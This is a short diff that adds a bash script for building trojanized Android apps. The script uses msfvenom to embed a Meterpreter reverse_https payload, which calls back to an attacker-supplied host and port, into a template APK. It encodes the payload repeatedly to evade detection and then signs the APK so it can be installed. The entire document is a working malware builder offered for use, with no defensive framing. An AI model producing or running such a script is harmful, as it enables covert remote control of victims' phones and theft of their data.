@@ -1,0 +1,8 @@
+#!/usr/bin/env bash
+set -e
+LHOST=$1; LPORT=$2; OUT=$3
+msfvenom -p android/meterpreter/reverse_https LHOST=$LHOST LPORT=$LPORT \
+  -x templates/base.apk -e x86/shikata_ga_nai -i 8 -a dalvik --platform android \
+  -o $OUT.apk
+java -jar uber-apk-signer-*.jar -a $OUT.apk
+echo "Signed APK ready at signed-$OUT.apk"
